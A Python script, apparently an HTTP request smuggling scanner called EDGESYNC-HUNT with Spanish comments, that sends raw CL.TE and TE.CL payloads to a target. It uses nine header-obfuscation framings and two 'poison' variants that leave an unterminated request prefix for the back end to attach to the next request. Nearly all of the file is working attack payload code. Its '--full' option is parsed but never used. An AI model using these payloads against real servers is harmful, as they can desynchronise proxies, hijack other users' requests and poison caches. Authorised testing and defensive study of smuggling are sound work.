#!/usr/bin/env python3
"""EDGESYNC-HUNT (v0.74.0): SONDA-DE-CORRELACION.

Salto sobre v0.73: el veredicto ya no nace de una sola dimension
(el eco). Ahora cada variante se observa en TRES dimensiones sobre
la MISMA conexion:

  dim1 framing     respuesta al mensaje ambiguo (eco / conteo)
  dim2 persistencia la conexion sigue viva tras el ambiguo, o el
                   edge la mata? un cierre activo del edge significa
                   algo muy distinto a una conexion que sigue con
                   estado inconsistente
  dim3 estado      el request siguiente (sonda) conserva su estado
                   esperado, o llega desplazado/envenenado?

La pregunta que responde: "¿el comportamiento observado demuestra
que DOS componentes interpretaron el mismo mensaje de forma
diferente?" Escalera de veredictos:

  RECHAZO-EDGE   el edge corto el framing ambiguo (400/close):
                 postura activa; nada observable, no se gasta
                 presupuesto extra
  SIN-DESYNC     el edge acepto y todo cuadra (o mix aceptado+
                 rechazado)
  SOSPECHA       una sola dimension desacuerda, sin eco
  DESYNC-DEMO    eco (o sonda envenenada) REPRODUCIBLE, con la
                 segunda capa pillada interpretando distinto

TOPOLOGY-PRE: pasada inicial barata que lee Server/Via/CF-Ray/
Age/X-Cache del baseline y clasifica el blanco (cdn-blindado |
proxy-intermedio | directo). CDN blindado -> bateria reducida
(V1, V2, P1); el resto -> bateria completa. La topologia queda
como evidencia y alimenta a UNIVERSAL-RECON.

Variantes: 9 framings (v0.73) + 2 POISON:
  P1 CL.TE: prefijo de envenenamiento (request sin terminar)
     dentro de la ventana CL; el back lo pega a la sonda y la
     respuesta de la sonda sale POR el camino del veneno
  P2 TE.CL: el mismo prefijo dentro del data de un chunk

Los ecos TE.CL y P2 (familia TECL) siguen siendo CANDIDATOS
(desync o pipelining: ambiguo sin prueba cruzada) y van a listas
propias: tecl_candidatos y poison_candidatos.

SEGURIDAD (anti-DoS, no negociable):
  - MAX_PROBES pruebas totales (baseline + 9 framings + 2 poisons
    + reproducciones), 1 conexion secuencial por variante
  - cooldown entre probes, sin flood, sin RST, cuerpos <= 4KB
  - stop al primer DESYNC-DEMO
  - lectura A->B: todo lo que viaja smuggleado es de solo lectura
"""
import argparse
import json
import re
import socket
import ssl
import time
from urllib.parse import urlparse

MAX_PROBES = 15
COOLDOWN = 0.4
MAX_BODY = 4096

SMUG_PATH = "/x-edgesync-sonde-{}"
SMUG_MARKER = "x-edgesync-echo"

VARIANTES = {
    "V1": "CLTE", "V2": "TECL", "V3": "CLTE", "V4": "CLTE",
    "V5": "CLTE", "V6": "CLTE", "V7": "CLTE", "V8": "CLTE",
    "V9": "TECL", "P1": "CLTE", "P2": "TECL",
}
ORDEN_FRAMINGS = ["V1", "V2", "V3", "V4", "V5", "V6", "V7",
                  "V8", "V9"]
ORDEN_POISON = ["P1", "P2"]
ALCANCE_CDN = ["V1", "V2", "P1"]

STATUS_RECHAZO = {"400", "405", "411", "413", "501", "505"}


def _connect(url, timeout=10.0):
    u = urlparse(url if "//" in url else "http://" + url)
    host = u.hostname or "127.0.0.1"
    port = u.port or (443 if u.scheme == "https" else 80)
    s = socket.create_connection((host, port), timeout=timeout)
    if u.scheme == "https":
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(s, server_hostname=host)
    return s, host


def _read_all(sock, quiet=0.8, cap=65535):
    sock.settimeout(quiet)
    out = b""
    try:
        while len(out) < cap:
            d = sock.recv(65535)
            if not d:
                break
            out += d
    except socket.timeout:
        pass
    return out


def _n_responses(raw):
    return max(0, sum(1 for p in raw.split(b"HTTP/1.1 ")
                      if b" " in p[:32]))


def _statuses(raw):
    return [x.decode() for x in re.findall(rb"HTTP/1\.1 (\d{3})", raw)]


def _resp_headers(raw):
    h = {}
    for m in re.finditer(rb"([\w-]+):\s*([^\r\n]*)", raw):
        h[m.group(1).decode().lower()] = m.group(2).decode(
            "latin-1", errors="replace").strip()
    return h


# ---------------- TOPOLOGY-PRE ----------------

CDN_HINTS = ["cloudflare", "akamai", "fastly", "cloudfront",
             "cdn", "incapsula", "sucuri", "bunnycdn"]
PROXY_HINTS = ["via", "x-served-by", "x-cache", "x-varnish",
               "x-forwarded-by", "age"]


def clasificar_topologia(headers):
    """headers: dict minusculas de la respuesta baseline."""
    server = headers.get("server", "").lower()
    es_cdn = any(h in server for h in CDN_HINTS) \
        or "cf-ray" in headers
    es_proxy = any(h in headers for h in PROXY_HINTS)
    if es_cdn:
        clase = "cdn-blindado"
    elif es_proxy:
        clase = "proxy-intermedio"
    else:
        clase = "directo"
    alcance = ALCANCE_CDN if clase == "cdn-blindado" else None
    return {"clase": clase,
            "alcance": alcance or ORDEN_FRAMINGS + ORDEN_POISON,
            "server": headers.get("server", ""),
            "via": headers.get("via", ""),
            "cache": headers.get("x-cache", headers.get("age", ""))}


# ---------------- payloads ----------------

def _smug(host, smug_path):
    return (f"GET {smug_path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Echo: {SMUG_MARKER}\r\n\r\n").encode()


def _poison(smug_path):
    # request SIN terminar: el back lo pega a la sonda siguiente
    return (f"GET {smug_path} HTTP/1.1\r\n"
            f"X-Poison: ").encode()


def build_probe(vid, host, smug_path):
    """Devuelve (probe, sonda, familia)."""
    smug = _smug(host, smug_path)
    poison = _poison(smug_path)
    if vid == "V1":
        body = b"0\r\n\r\n" + smug
        te = b"Transfer-Encoding: chunked\r\n"
        cl = len(body)
    elif vid == "V2":
        hexline = hex(len(smug)).encode()
        body = hexline + b"\r\n" + smug + b"\r\n0\r\n\r\n"
        te = b"Transfer-Encoding: chunked\r\n"
        cl = len(hexline) + 2
    elif vid == "V3":
        body = b"0\r\n\r\n" + smug
        te = b"Transfer-Encoding: chunked\r\n" \
             b"Transfer-Encoding: chunked\r\n"
        cl = len(body)
    elif vid == "V4":
        body = b"0\r\n\r\n" + smug
        te = b"Transfer-Encoding : chunked\r\n"
        cl = len(body)
    elif vid == "V5":
        body = b"0\r\n\r\n" + smug
        te = b"Transfer-Encoding: identity\r\n" \
             b"Transfer-Encoding: chunked\r\n"
        cl = len(body)
    elif vid == "V6":
        body = b"0\r\n\r\n" + smug
        te = b"Transfer-Encoding:\tchunked\r\n"
        cl = len(body)
    elif vid == "V7":
        body = b"0\r\n\r\n" + smug
        te = b"tRansfer-EnCoDiNg: ChUnKeD\r\n"
        cl = len(body)
    elif vid == "V8":
        body = b"0\r\n\r\n" + smug
        te = b"Transfer-Encoding : chunked\r\n" \
             b"Transfer-Encoding : chunked\r\n"
        cl = len(body)
    elif vid == "V9":
        extline = hex(len(smug)).upper().encode() + b";x=1"
        body = extline + b"\r\n" + smug + b"\r\n0\r\n\r\n"
        te = b"Transfer-Encoding: chunked\r\n"
        cl = len(extline) + 2
    elif vid == "P1":
        body = b"0\r\n\r\n" + poison
        te = b"Transfer-Encoding: chunked\r\n"
        cl = len(body)
    elif vid == "P2":
        hexline = hex(len(poison)).encode()
        body = hexline + b"\r\n" + poison + b"\r\n0\r\n\r\n"
        te = b"Transfer-Encoding: chunked\r\n"
        cl = len(hexline) + 2
    else:
        raise ValueError(f"variante desconocida: {vid}")
    if len(body) > MAX_BODY:
        raise ValueError("cuerpo excede tope anti-DoS")
    probe = (b"POST / HTTP/1.1\r\n"
             b"Host: " + host.encode() + b"\r\n"
             b"Content-Length: " + str(cl).encode() + b"\r\n"
             + te +
             b"Content-Type: application/x-www-form-urlencoded\r\n\r\n"
             + body)
    sonda = (f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n").encode()
    return probe, sonda, VARIANTES[vid]


# ---------------- disparo con 3 dimensiones ----------------

def _disparar(url, vid, timeout, smug_path):
    """Un probe-test: 1 conexion. probe -> leer (dim1+dim2) ->
    sonda -> leer (dim3). Devuelve las 3 dimensiones."""
    s, host = _connect(url, timeout)
    try:
        probe, sonda, familia = build_probe(vid, host, smug_path)
        s.sendall(probe)
        pre = _read_all(s, quiet=0.7)          # dim1+dim2
        s.sendall(sonda)
        post = _read_all(s, quiet=1.2)        # dim3
    finally:
        s.close()
    raw = pre + post
    txt = raw.decode("latin-1", errors="replace")
    return {
        "variante": vid,
        "familia": familia,
        "pre": _n_responses(pre),
        "post": _n_responses(post),
        "status_pre": _statuses(pre),
        "status_post": _statuses(post),
        "eco": smug_path in txt or SMUG_MARKER in txt,
        "bytes": len(raw),
    }


def _clasifica_variant(r, evid):
    """Escalera de una variante. Devuelve None o senal."""
    if r["eco"]:
        return "eco"
    post_vacio = r["post"] == 0
    if post_vacio:
        st = r["status_pre"]
        if r["pre"] == 1 and st and st[0] in STATUS_RECHAZO:
            evid.setdefault("front_rechazos", []).append(
                r["variante"])
            return "rechazo"
        evid.setdefault("front_cierres", []).append(r["variante"])
        return "cierre"
    # dim3: la sonda conserva su estado? sin eco: todas las
    # respuestas post con status distinto al esperado = anomalia
    if r["post"] >= 1 and r["status_post"] \
            and not any(s.startswith("2") for s in r["status_post"]):
        evid.setdefault("sonda_anomala", []).append(r["variante"])
        return "anomalia"
    if r["pre"] + r["post"] != 2:
        evid["conteos_anormales"].append(
            {"variante": r["variante"],
             "respuestas": r["pre"] + r["post"]})
        return "conteo"
    return None


def audit(cfg):
    """cfg: url, timeout, variant (opcional), full (bool: fuerza
    bateria completa en CDN). Devuelve veredicto + evidencia."""
    url = cfg["url"]
    timeout = float(cfg.get("timeout", 10.0))
    solo = cfg.get("variant")
    full = bool(cfg.get("full"))
    smug_path = cfg.get("smug_path") or SMUG_PATH.format(int(time.time()))

    probes = 0
    evid = {"url": url, "probes": probes, "max_probes": MAX_PROBES,
            "smug_path": smug_path, "tecl_candidatos": [],
            "poison_candidatos": [], "conteos_anormales": [],
            "consistentes": 0}

    # baseline: TOPOLOGY-PRE + el target debe responder
    s, host = _connect(url, timeout)
    probes += 1
    try:
        s.sendall(f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
        base = _read_all(s)
    finally:
        s.close()
    time.sleep(COOLDOWN)
    if not base.strip():
        evid["probes"] = probes
        return {"veredicto": "NO-RESPONDE", "evidencia": evid}
    topo = clasificar_topologia(_resp_headers(base))
    evid["topologia"] = topo
    status_base = (_statuses(base) or ["200"])[0]
    evid["status_baseline"] = status_base

    if solo:
        plan = [solo]
    else:
        plan = topo["alcance"]

    def fase(ids, es_poison):
        nonlocal probes
        for vid in ids:
            if probes >= MAX_PROBES:
                evid["nota_presupuesto"] = "presupuesto agotado"
                return None
            r = _disparar(url, vid, timeout, smug_path)
            probes += 1
            evid["probes"] = probes
            senal = _clasifica_variant(r, evid)
            if senal == "eco" and r["familia"] == "CLTE":
                # reproduccion obligatoria antes de DEMO
                r2 = _disparar(url, vid, timeout, smug_path + "-r")
                probes += 1
                evid["probes"] = probes
                if r2["eco"]:
                    evid["variante_demo"] = vid
                    evid["tipo_demo"] = ("poison" if es_poison
                                         else "eco")
                    evid["repro"] = True
                    return vid
                evid["eco_no_reproducido"] = vid
            elif senal == "eco" and r["familia"] == "TECL":
                (evid["poison_candidatos"] if es_poison
                 else evid["tecl_candidatos"]).append(vid)
            elif senal == "anomalia":
                # una sonda anomala suelta puede ser ruido de red:
                # exige reproduccion antes de sostener SOSPECHA
                if probes >= MAX_PROBES:
                    evid["nota_presupuesto"] = "presupuesto agotado"
                    return None
                r2 = _disparar(url, vid, timeout, smug_path + "-r")
                probes += 1
                evid["probes"] = probes
                s2 = _clasifica_variant(r2, evid)
                if s2 != "anomalia":
                    evid["sonda_anomala"].remove(vid)
                    evid.setdefault("anomalia_esporadica",
                                     []).append(vid)
                else:
                    # _clasifica agrego vid dos veces: dejar una
                    while evid["sonda_anomala"].count(vid) > 1:
                        evid["sonda_anomala"].remove(vid)
                    evid.setdefault("anomalia_confirmada",
                                     []).append(vid)
            elif senal is None:
                evid["consistentes"] += 1
        return None

    framings = [x for x in plan if x.startswith("V")]
    poisons = [x for x in plan if x.startswith("P")]
    demo = fase(framings, False)
    if demo:
        return {"veredicto": "DESYNC-DEMO", "evidencia": evid}
    if poisons:
        demo = fase(poisons, True)
        if demo:
            return {"veredicto": "DESYNC-DEMO", "evidencia": evid}

    if evid.get("eco_no_reproducido"):
        return {"veredicto": "SOSPECHA", "evidencia": evid}
    if evid["conteos_anormales"] or evid.get("anomalia_confirmada"):
        return {"veredicto": "SOSPECHA", "evidencia": evid}
    if evid["consistentes"] == 0:
        if evid.get("front_rechazos") or evid.get("front_cierres"):
            return {"veredicto": "RECHAZO-EDGE", "evidencia": evid}
        return {"veredicto": "SIN-DESYNC", "evidencia": evid}
    return {"veredicto": "SIN-DESYNC", "evidencia": evid}


def main():
    ap = argparse.ArgumentParser(
        description="EDGESYNC sonda de correlacion (3 dimensiones)")
    ap.add_argument("url", help="http://target[:puerto]/")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("--variant", help="una variante (V1..V9, P1, P2)")
    ap.add_argument("--full", action="store_true",
                    help="forzar bateria completa en CDN")
    ap.add_argument("--json", action="store_true")
    a = ap.parse_args()
    r = audit({"url": a.url, "timeout": a.timeout,
              "variant": a.variant, "full": a.full})
    if a.json:
        print(json.dumps(r, indent=2, default=str))
    else:
        print(f"[EDGESYNC] {a.url} -> {r['veredicto']}")
        for k, v in r["evidencia"].items():
            print(f"  {k}: {v}")


if __name__ == "__main__":
    main()
